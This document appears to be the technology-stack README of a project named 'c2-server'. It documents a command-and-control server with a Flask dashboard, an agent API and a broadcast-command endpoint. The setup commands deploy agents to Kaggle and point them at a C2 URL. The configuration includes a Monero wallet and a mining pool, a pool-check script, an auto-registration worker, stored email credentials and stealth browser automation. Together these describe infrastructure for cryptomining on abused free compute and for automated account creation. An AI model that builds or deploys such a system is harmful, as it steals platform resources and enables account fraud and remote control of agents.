# Technology Stack

## Programming Languages

### Primary Languages
- **Python 3.8+** - Main application language
  - Backend server implementation
  - Agent scripts
  - Automation and utilities
- **JavaScript (ES6+)** - Frontend interactivity
  - WebSocket client
  - Dashboard UI logic
- **PowerShell** - Windows agent implementation
- **HTML5/CSS3** - Web interface templates

## Core Dependencies

### Web Framework
- **Flask 3.0.0+** - Web application framework
- **Flask-SocketIO 5.3.0+** - WebSocket support for real-time updates
- **Flask-Bcrypt 1.0.0+** - Password hashing and authentication
- **Eventlet 0.36.0+** - Async networking library for WebSocket

### Production Server
- **Gunicorn 21.0.0+** - WSGI HTTP server for production deployment

### HTTP & Networking
- **Requests 2.31.0+** - HTTP client library
- **Cryptography 41.0.0+** - Encryption and SSL/TLS support

### System & Utilities
- **psutil 5.9.0+** - System and process monitoring
- **python-dotenv 1.0.0+** - Environment variable management

### Data Processing
- **Faker 20.0.0+** - Fake data generation for testing
- **NumPy 1.26.0+** - Numerical computing
- **Pandas 2.1.0+** - Data manipulation and analysis
- **Pillow 10.0.0+** - Image processing

### Optional Dependencies
- **Playwright 1.40.0+** - Browser automation (commented out)
- **Selenium 4.15.0+** - Browser automation (commented out)
- **undetected-chromedriver 3.5.0+** - Stealth browser automation (commented out)
- **Redis 4.5.0+** - Caching layer (commented out)
- **Prometheus-client 0.19.0+** - Metrics export (commented out)

### Development Tools
- **pytest 7.4.0+** - Testing framework

## Build System

### Package Management
- **pip** - Python package installer
- **setuptools** - Package building and distribution
- **requirements.txt** - Dependency specification

### Installation
```bash
pip install -r requirements.txt
```

### Package Setup
```bash
python setup.py install
```

### Extras Installation
```bash
# Server components
pip install -e ".[server]"

# GPU optimizer
pip install -e ".[optimizer]"

# Browser agents
pip install -e ".[agents]"

# Development tools
pip install -e ".[dev]"
```

## Database

### Primary Database
- **SQLite** - Embedded relational database
  - Location: `data/c2.db`
  - Models defined in `src/c2/models.py`
  - No external database server required

### Data Storage
- **JSON files** - Configuration and account storage
  - `data/accounts.json` - Agent accounts
  - `data/email_accounts.json` - Email credentials
- **File system** - Uploads, screenshots, logs

## Development Commands

### Server Management
```bash
# Start server (development)
python3 run_unified.py --host 0.0.0.0 --port 5000

# Start server (debug mode)
python3 run_unified.py --debug

# Start server (production with Gunicorn)
gunicorn -c gunicorn.conf.py wsgi:app

# Using management script
./manage.sh start      # Start server
./manage.sh stop       # Stop server
./manage.sh restart    # Restart server
./manage.sh status     # Check status
./manage.sh logs       # View logs
./manage.sh db         # Database stats
```

### Testing
```bash
# Run all tests
pytest

# Run specific test file
pytest tests/test_core.py

# Run with coverage
pytest --cov=src tests/
```

### Development Tools
```bash
# Code formatting (if Black installed)
black src/ tests/

# Linting (if Flake8 installed)
flake8 src/ tests/

# Type checking (if mypy installed)
mypy src/
```

### Database Operations
```bash
# Backup database
python3 scripts/backup.py

# Migration
./scripts/migrate.sh

# Setup backup cron
./scripts/setup_backup_cron.sh
```

### Deployment
```bash
# Docker build
docker build -t c2-server .

# Docker Compose
docker-compose up -d

# Install as systemd service
sudo cp deploy/c2-server.service /etc/systemd/system/
sudo systemctl enable c2-server
sudo systemctl start c2-server
```

### Agent Deployment
```bash
# Deploy Kaggle agents
python3 src/agents/kaggle/deploy.py --count 5

# Deploy with C2 URL
python3 src/agents/kaggle/deploy.py --c2-url http://YOUR_IP:5000
```

### Utility Scripts
```bash
# Check mining pool
python3 scripts/check_pool.py

# Restart server
python3 scripts/restart_server.py

# Restart worker
python3 scripts/restart_worker.py

# Installation script
./scripts/install.sh
```

## Environment Configuration

### Required Environment Variables (.env)
```bash
SECRET_KEY=your-secret-key-here
DATABASE_URL=sqlite:///data/c2.db

# Kaggle API
KAGGLE_USERNAME=your-username
KAGGLE_KEY=your-api-key

# Mining Configuration
WALLET=your-xmr-wallet-address
POOL=gulf.moneroocean.stream:10128

# Optional
REDIS_URL=redis://localhost:6379
DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
TELEGRAM_BOT_TOKEN=your-bot-token
```

## API Endpoints

### Main API
- `GET /api/health` - Health check
- `GET /api/stats` - Server statistics
- `GET /api/agents` - List all agents
- `POST /api/task/create` - Create new task
- `POST /api/task/broadcast` - Broadcast command to all agents

### Agent API
- `POST /api/agent/register` - Agent registration
- `GET /api/agent/tasks` - Get pending tasks
- `POST /api/agent/result` - Submit task result
- `POST /api/agent/heartbeat` - Agent heartbeat

### Kaggle API
- `POST /api/kaggle/agent/checkin` - Kaggle agent check-in
- `POST /api/kaggle/agent/result` - Submit result
- `GET /api/kaggle/agents/status` - Get agent status
- `POST /api/kaggle/agent/queue` - Queue command

## Logging

### Log Configuration
- Configuration file: `config/logging.yaml`
- Log directory: `logs/`
- Format: JSON structured logging
- Rotation: Automatic log rotation

### Log Files
- `c2-server.log` - Main server logs
- `src.c2.server.log` - C2 module logs
- `src.autoreg.worker.log` - Auto-registration logs
- `error.log` - Error logs
- `access.log` - HTTP access logs

## Version Information
- **Project Version**: 2.0.0
- **Python Requirement**: >=3.8
- **Status**: Production Ready
- **License**: MIT
